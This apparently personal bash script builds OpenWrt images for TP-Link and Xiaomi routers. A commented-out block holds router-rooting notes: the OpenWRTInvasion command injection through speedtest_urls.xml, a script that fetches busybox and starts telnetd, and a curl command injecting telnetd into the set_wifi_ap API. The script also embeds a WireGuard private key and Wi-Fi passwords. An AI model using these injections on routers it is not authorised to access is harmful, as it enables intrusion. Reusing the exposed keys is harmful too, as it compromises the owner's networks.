#!/usr/bin/env bash
readonly DIRNAME="$(readlink -f "$(dirname "$0")")"
readonly SCRIPTNAME=${0##*/}
if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
    exec 5> "${DIRNAME}/$(date '+%Y%m%d%H%M%S').${SCRIPTNAME}.debug.log"
    BASH_XTRACEFD="5"
    export PS4='[\D{%FT%TZ}] ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
    set -o xtrace
fi
VERSION+=("build-openwrt.sh - eea05b0 - 2021-07-14T17:11:16+08:00")
################################################################################
cat <<'EOF'
change repositories source from downloads.openwrt.org to mirrors.tuna.tsinghua.edu.cn:
    sed -i 's_downloads.openwrt.org_mirrors.tuna.tsinghua.edu.cn/openwrt_' repositories.conf
EOF
# etc/
# ├── banner
# ├── config/
# │   ├── dropbear
# │   └── system
# ├── dropbear/
# │   └── authorized_keys
# └── uci-defaults/
#kmod-usb-uhci kmod-usb-ohci PACKAGES="kmod-tun kmod-zram zram-swap block-mount kmod-fs-ext4 e2fsprogs kmod-usb2 kmod-usb-storage firewall -ip6tables -kmod-ip6tables -kmod-ipv6 -odhcp6c -swconfig " 

: <<'EOF'
# mount jffs2 image!
umount /dev/mtdblock0 &>/dev/null
modprobe -r mtdram &>/dev/null
modprobe -r mtdblock &>/dev/null
modprobe mtdram total_size=32768 erase_size=$esize || exit 1
modprobe mtdblock || exit 1
dd if="$1" of=/dev/mtdblock0 || exit 1
mount -t jffs2 /dev/mtdblock0 $2 || exit 1
echo "Successfully mounted $1 on $2"
exit 0


firmware extrack user binwalk tools
MIR4A 100M
    miwifi_r4ac_firmware_e9eec_2.18.58.bin
    breed-mt7688-reset38.bin
  breed boot openwrt:
    1: telnet breed
    2: wget http://192.168.1.100/firmware.bin
    Connecting to 192.168.1.100:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8651000/0x8400f8 (8MB) []
    Saving to address 0x80000000
    
    3: flash erase 0x160000 0x850000
    4: flash write 0x160000 0x80000000 0x850000
    （0x160000为要写入firmware的目的地址， 0x80000000是下载的固件的保存地址， 0x200000比文件大一点）
    5: boot flash 0x160000 （0x160000启动地址）
    
    6: 断电重启路由器，breed还是会从0x50000处启动系统，进入breed的web界面，启用环境变量功能！这一步启动环境变量功能界面中，位置选择breed内部，设置启用后，需要重启。
    7: 再次进breed的web界面中，在环境变量界面，
        增加autoboot.command 字段，值boot flash 0x160000


# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
print(r1.text)
# exec download speed test, exec command
print("start exec command...")
r2 = requests.get(
    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok),
    proxies=proxies
)
print(r2.text)
print("done! Now you can connect to the router using several options: (user: root, password: root)")
print("* telnet {}".format(router_ip_address))

speedtest_urls.xml:
<?xml version="1.0"?>
<root>
	<class type="1">
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
	</class>
	<class type="2">
		<item url="http://{router_ip_address} -q -O /dev/null;{command};exit;wget http://{router_ip_address} "/>
	</class>
	<class type="3">
		<item uploadurl="http://www.speedtest.cn/"/>
	</class>
</root>
script.sh:
    echo -e "root\nroot" | passwd root

    pgrep busybox | xargs kill || true
    cd /tmp
    rm -rf busybox
    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
    # https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel
    wget http://192.168.31.101:8080/busybox-mipsel -O /tmp/busybox
    chmod +x busybox
    cd /tmp
    ./busybox telnetd

###################################################################################################
备份eeprom (!!!!!!!!!!!)
dd if=/dev/mtd3 of=/tmp/eeprom.bin
mtd -r write /tmp/breed.bin Bootloader
进入breed后刷回eeprom.bin

breed web console : 按住reset键不放再插上电三秒松开->http://192.168.1.1

Xiaomi Mini
    In case you want to skip all the Xiaomi download etc, here are some instructions to flash directly OpenWRT/PandoraBox on stock firmware via code injection bug.
    https://mirom.ezbox.idv.tw/en/miwifi/R1CM/roms-stable/
NOTE
This method has been successfully tested on
-> Xiaomi Mini - Stock firmware v2.6.17
-> Xiaomi Lite aka "Youth" or "Nano" - Stock firmware v2.2.8

STEPS
1) Power on and setup the Xiaomi router until it reboots and gets IP address 192.168.31.1
2) Log-in into the router and grab the value of the stok URL parameter (for instance: "9c2428de4d17e2db7e5a6a337e6f57a3")
3) Replace the <STOK> placeholder and load this URL in your browser or curl, this will start telnetd on the router:
STOK=
curl -vvv "http://192.168.31.1/cgi-bin/luci/;stok=${STOK}/api/xqnetwork/set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&channel=1%3B%2Fusr%2Fsbin%2Ftelnetd

It should spit out some wifi error code, that is ok, don't worry.

4) Replace the <STOK> placeholder, the current password and the desired root password and load this URL in your browser or curl, this will set the router root password
PASSWD=
NEW_PASSWD=password
curl -vvv "http://192.168.31.1/cgi-bin/luci/;stok=${STOK}/api/xqsystem/set_name_password?oldPwd=${PASSWD}&newPwd=${NEW_PASSWD}"

It should spit out: {"code":0}

5) Telnet to the router, enter user root and NEWPASS chosen above.

6) wget your favourite .bin and flash with mtd -r write firmware.bin OS1
         mtd -r write /tmp/20140703.bin firmware

7) Router reboots wink

# Linux dialog with timeout & default No button
改SN 的方法如下
nvram set SN=你路由上的SN号
nvram set wl0_ssid=Xiaomi_XXXX_5G
nvram set wl1_ssid=Xiaomi_XXXX
保存
nvram commit
bdata set model=R1CM
bdata set color=101
bdata set CountryCode=CN
bdata set SN=你路由上的SN号
bdata set wl0_ssid=Xiaomi_XXXX_5G
bdata set wl1_ssid=Xiaomi_XXXX
保存
bdata sync && bdata commit
XXXX是你网卡的后四位，不知道的自己用手机下个WIFI软件看接入点去
然后重启下路由器，用手机看看能不能绑定成功，如果绑定成功啦，用http://192.168.XX.XX/cgi-bin/luci/;stok=XX/api/xqsystem/init_info XX.XX是你路由器的管理地址stok=XX是登陆路由以后的加密字符串，看下SN是不是你自己的啦。注意刷啦这个固件ROOT密码只能用我提供的，官网提供的用不了
EOF

DISABLED_SERVICES="${DISABLED_SERVICES:-} odhcpd set-irq-affinity"
PACKAGES_REMOVE=" "                                 #remove package
PACKAGES=" kmod-batman-adv kmod-geneve kmod-gre kmod-iptunnel kmod-l2tp kmod-macvlan kmod-pptp kmod-tun kmod-vxlan ip-full ipset"
PACKAGES+=" kmod-zram zram-swap"                    #zram swap
PACKAGES+=" kmod-wireguard wireguard-tools"         #wireguard

dialog() {
    local title="${1}"
    local menu="${2}"
    declare -a items=("${!3}")
    local item=$(whiptail --notags \
        --title "${title}" \
        --menu "${menu}" \
        0 0 10 \
        "${items[@]}" 3>&1 1>&2 2>&3 || true)
    echo -n "${item}"
}

add_openssh_key() {
    ### Add SSH public key
    local dir="${1}"
    if [ ! -d "${dir}/root/.ssh" ]; then
        mkdir -p -m0700 "${dir}/root/.ssh"
    fi
    cat <<EOF >"${dir}/root/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKxdriiCqbzlKWZgW5JGF6yJnSyVtubEAW17mok2zsQ7al2cRYgGjJ5iFSvZHzz3at7QpNpRkafauH/DfrZz3yGKkUIbOb0UavCH5aelNduXaBt7dY2ORHibOsSvTXAifGwtLY67W4VyU/RBnCC7x3HxUB6BQF6qwzCGwry/lrBD6FZzt7tLjfxcbLhsnzqOG2y76n4H54RrooGn1iXHBDBXfvMR7noZKbzXAUQyOx9m07CqhnpgpMlGFL7shUdlFPNLPZf5JLsEs90h3d885OWRx9Kp+O05W2gPg4kUhGeqO6IY09EPOcTupw77PRHoWOg4xNcqEQN2v2C1lr09Y9 root@yinzh
EOF
    chmod 0600 "${dir}/root/.ssh/authorized_keys"
}

add_uci_default_automount_media() {
    local rootfs="${1}"
    if [ ! -d "${rootfs}/etc/uci-defaults" ]; then
        mkdir -p -m0755 "${rootfs}/etc/uci-defaults"
    fi
    cat << 'EOF' > "${rootfs}/etc/uci-defaults/99-media_mount"
uci set fstab.@global[0].auto_mount=1
uci add fstab mount
uci set fstab.@mount[0].target=/media
uci set fstab.@mount[0].label=media
uci set fstab.@mount[0].options=ro
uci set fstab.@mount[0].enabled=1
uci commit fstab
exit 0
EOF
}

add_uci_default_password() {
    local rootfs="${1}"
    local pass="${2:-password}"
    if [ ! -d "${rootfs}/etc/uci-defaults" ]; then
        mkdir -p -m0755 "${rootfs}/etc/uci-defaults"
    fi
    cat << EOF > "${rootfs}/etc/uci-defaults/99-passwd"
passwd << EOPWD
${pass}
${pass}
EOPWD
exit 0
EOF
}

add_shell_ps1() {
    ### Add PS1
    local rootfs="${1}"
    if [ ! -d "${rootfs}/etc/profile.d" ]; then
        mkdir -p -m0755 "${rootfs}/etc/profile.d"
    fi
    cat <<EOF >"${rootfs}/etc/profile.d/johnyin.sh"
export PS1="\[\033[1;31m\]\u\[\033[m\]@\[\033[1;32m\]\h:\[\033[33;1m\]\w\[\033[m\]$"
set -o vi
EOF
}

add_demo() {
    local file="${1}"
    cat << 'EOF' > ${file}
firmware reset: firstboot

sed -i 's_downloads.openwrt.org_mirrors.tuna.tsinghua.edu.cn/openwrt_' /etc/opkg/distfeeds.conf

add luci web:
    opkg install luci-nginx nginx luci-i18n-base-zh-cn luci-app-wireguard luci-i18n-wireguard-zh-cn luci-i18n-opkg-zh-cn luci-i18n-firewall-zh-cn

# 域名劫持
uci add dhcp domain
uci set dhcp.@domain[-1].name='www.facebook.com'
uci set dhcp.@domain[-1].ip='1.2.3.4'
# Return 10.10.10.1 on query domain home and subdomain *.home
uci add_list dhcp.@dnsmasq[0].address="/home/10.10.10.1"
# Forward DNS queries for a specific domain and all its subdomains to a different server
uci add_list dhcp.@dnsmasq[0].server="/example.com/192.168.2.1"
# add dns server
uci delete dhcp.@dnsmasq[0].server
uci add_list dhcp.@dnsmasq[0].server="114.114.114.114"
uci add_list dhcp.@dnsmasq[0].server="8.8.4.4"
# if no dnsmasq. so : uci add_list network.wan.dns="8.8.4.4"
# Blacklist maybe Ad block
uci add_list dhcp.@dnsmasq[0].server="/example.com/"
# Whitelist
uci add_list dhcp.@dnsmasq[0].server="/example.com/#"
uci add_list dhcp.@dnsmasq[0].server="/#/"

uci commit dhcp
/etc/init.d/dnsmasq restart

# 更改dhcp DNS(6=DNS, 3=Default Gateway, 44=WINS)
uci set dhcp.@dnsmasq[0].dhcp_option='6,192.168.1.1,8.8.8.8'
uci commit dhcp
uci set dhcp.@dnsmasq[0].rebind_protection=0

uci add fstab swap
uci set fstab.@swap[0].device='/swapfile'
uci set fstab.@swap[0].enabled='1'
uci commit fstab

uci set fstab.@global[0].auto_mount=1
uci add fstab mount
uci set fstab.@mount[0].target=/media
uci set fstab.@mount[0].label=media
# uci set fstab.@mount[0].uuid=uuid
# uci set fstab.@mount[0].fstype=ext4
# uci set fstab.@mount[0].enabled_fsck=1
uci set fstab.@mount[0].options=ro
# ro,noatime...
uci set fstab.@mount[0].enabled=1
uci commit fstab

#disable dhcp on wwan
uci set dhcp.wwan=dhcp
uci set dhcp.wwan.interface='wwan'
uci set dhcp.wwan.ignore=1
uci commit dhcp

uci set network.lan.gateway='192.168.168.1'

# Configure pppoe connection
uci set network.wan.proto=pppoe
uci set network.wan.username='xx'
uci set network.wan.password='****'
uci commit
ifup wan
EOF
}

add_home_ap_default() {
    cat <<'EOFDFT'
uci rename firewall.@zone[0]=lan
uci rename firewall.@zone[1]=wan
uci commit
uci -q batch <<-EOF
set network.wg0=interface
set network.wg0.proto='wireguard'
set network.wg0.private_key='yLubHN8S95ZJxM1cH51p44FWH4bg7uMAoD5aivJgK3E='
add_list network.wg0.addresses='10.0.2.7/24'
set network.wg0.mtu='1420'

set network.wgserver=wireguard_wg0
set network.wgserver.public_key='nuLghaY5Kt7v0+fEvdWR1cc2+eFg5TMBoskJYz8Bl10='
set network.wgserver.endpoint_host='59.46.220.174'
set network.wgserver.endpoint_port='50000'
set network.wgserver.route_allowed_ips='1'
set network.wgserver.persistent_keepalive='10'
add_list network.wgserver.allowed_ips='10.0.2.0/24'
EOF
uci add_list firewall.lan.network='wg0'
iptables -t nat -A POSTROUTING -s 192.168.31.0/24 -d 10.0.2.0/24 -o wg0 -j MASQUERADE
uci commit

uci -q batch <<-EOF
delete wireless.default_radio0
delete wireless.default_radio1
set wireless.radio0.disabled=0
set wireless.radio1.disabled=0

set network.wwan=interface
set network.wwan.proto='static'
set network.wwan.ipaddr='192.168.10.93'
set network.wwan.netmask='255.255.255.0'
set network.wwan.gateway='192.168.10.1'

set wireless.toup=wifi-iface
set wireless.toup.device='radio1'
set wireless.toup.network='wwan'
set wireless.toup.mode='sta'
set wireless.toup.ssid='s905d03'
set wireless.toup.encryption='psk'
set wireless.toup.key='Admin@123'

set wireless.mywifi5g=wifi-iface
set wireless.mywifi5g.device='radio0'
set wireless.mywifi5g.network='lan'
set wireless.mywifi5g.mode='ap'
set wireless.mywifi5g.encryption='psk2'
set wireless.mywifi5g.key='Admin@123'
set wireless.mywifi5g.ssid='johnap5g'

set wireless.mywifi2g=wifi-iface
set wireless.mywifi2g.device='radio1'
set wireless.mywifi2g.network='lan'
set wireless.mywifi2g.mode='ap'
set wireless.mywifi2g.encryption='psk2'
set wireless.mywifi2g.key='Admin@123'
set wireless.mywifi2g.ssid='johnap2g'

EOF
uci add_list firewall.wan.network=wwan
uci add_list dhcp.@dnsmasq[0].server='114.114.114.114'

cat<<EOF
# Configure firewall for if wg server mode
uci del_list firewall.lan.network="${WG_IF}"
uci add_list firewall.lan.network="${WG_IF}"
uci -q delete firewall.wg
uci set firewall.wg="rule"
uci set firewall.wg.name="Allow-WireGuard"
uci set firewall.wg.src="wan"
uci set firewall.wg.dest_port="${WG_PORT}"
uci set firewall.wg.proto="udp"
uci set firewall.wg.target="ACCEPT"
uci commit firewall
/etc/init.d/firewall restart
EOF
uci commit
EOFDFT
}

add_sysctl() {
    cat <<EOF
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv4.ip_local_port_range = 1024 65531
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_tw_reuse = 0
EOF
}

choices=("tl-wr703n-v1" "WR703N" "miwifi-mini" "MiWIFI MINI" "xiaomi_mir4a-100m" "MiRouter 4A 100M")
id=$(dialog "Openwrt Select" "select model" choices[@])
case "$id" in
    ########################################
    tl-wr703n-v1) # 703N
        PACKAGES+=" block-mount kmod-usb-storage kmod-usb-storage-uas kmod-usb3" #usb storage
        PACKAGES+=" kmod-fs-ext4 kmod-fs-vfat e2fsprogs"    #vfat ext4 support
        PACKAGES+=" aria2 rsync"                            #other tools
        add_uci_default_automount_media "${DIRNAME}/mydir"
        ;;
    miwifi-mini) # Mini
        PACKAGES+=" block-mount kmod-usb3 kmod-usb-storage-uas  kmod-usb-storage" #usb storage
        PACKAGES+=" kmod-fs-ext4 kmod-fs-vfat e2fsprogs"    #vfat ext4 support
        PACKAGES+=" aria2 rsync"                            #other tools
        PACKAGES+=" kmod-fs-jfs kmod-fs-xfs"                #xfs jfs support
        PACKAGES+=" nfs-kernel-server nfs-kernel-server-utils" #NFS
        PACKAGES+=" openssh-client openssh-server openssh-sftp-server" #openssh
        PACKAGES+=" eject jq lsof procps-ng-ps socat sshfs tcpdump tmux dnsmasq-full nfs-utils kmod-veth relayd"
        PACKAGES_REMOVE+=" -dropbear -dnsmasq"              #remove packages
        add_openssh_key "${DIRNAME}/mydir"
        add_uci_default_automount_media "${DIRNAME}/mydir"
        add_uci_default_password "${DIRNAME}/mydir" "password"
        mkdir -p "${DIRNAME}/mydir/root" && add_home_ap_default > "${DIRNAME}/mydir/root/default.sh"
        mkdir -p "${DIRNAME}/mydir/etc/sysctl.d" && add_sysctl  > "${DIRNAME}/mydir/etc/sysctl.d/11-johnyin.conf"
        ;;
    xiaomi_mir4a-100m) # R4AC
        PACKAGES+=" aria2 rsync"                            #other tools
        PACKAGES+=" openssh-client openssh-server openssh-sftp-server" #openssh
        PACKAGES+=" jq lsof procps-ng-ps socat sshfs tcpdump tmux dnsmasq-full nfs-utils"
        PACKAGES_REMOVE+=" -dropbear -dnsmasq"              #remove packages
        add_openssh_key "${DIRNAME}/mydir"
        add_uci_default_password "${DIRNAME}/mydir" "password"
        ;;
    *)  echo "Unexpected option $id"; exit 1;;
esac

PACKAGES+=${PACKAGES_REMOVE}

# mydir/etc/ssh/sshd_config
# #change 192.168.1.1 => 192.168.31.1
# mydir/bin/config_generate
add_demo "${DIRNAME}/mydir/root/demo"
add_shell_ps1 "${DIRNAME}/mydir"

rm ./out/* -f

echo "DISABLED_SERVICES=${DISABLED_SERVICES:-}"
echo "BIN_DIR=${DIRNAME}/out/"
echo "PACKAGES=${PACKAGES}"
find "${DIRNAME}/mydir" -type f 2>/dev/null  | sed "s|${DIRNAME}/||g" | xargs -I@ echo "Add File: [@]"

make image PROFILE="${id}" \
PACKAGES="${PACKAGES}" \
BIN_DIR="${DIRNAME}/out/" \
FILES="${DIRNAME}/mydir" \
DISABLED_SERVICES="${DISABLED_SERVICES:-}"

#  Remove useless files from firmware
#  
#  1. Create file 'files_remove' with full filenames:
#  
#  /lib/modules/3.10.49/ts_bm.ko
#  /lib/modules/3.10.49/nf_nat_ftp.ko
#  /lib/modules/3.10.49/nf_nat_irc.ko
#  /lib/modules/3.10.49/nf_nat_tftp.ko
#  
#  2. Patch Makefile
#  
#  ifneq ($(USER_FILES),)
#  $(MAKE) copy_files
#  endif
#  +
#  +ifneq ($(FILES_REMOVE),)
#  +	@echo
#  +	@echo Remove useless files
#  +
#  +	while read filename; do				\
#  +	    rm -rfv "$(TARGET_DIR)$$filename";	\
#  +	done < $(FILES_REMOVE);
#  +endif
#  +
#  $(MAKE) package_postinst
#  $(MAKE) build_image
#  
#  3. Rebuild firmware
#  
#  # make image \
#  	PROFILE=TLWR841 \
#  	PACKAGES="-firewall -ip6tables -kmod-ip6tables -kmod-ipv6 -odhcp6c -ppp -ppp-mod-pppoe" \
#  	FILES_REMOVE="files_remove"
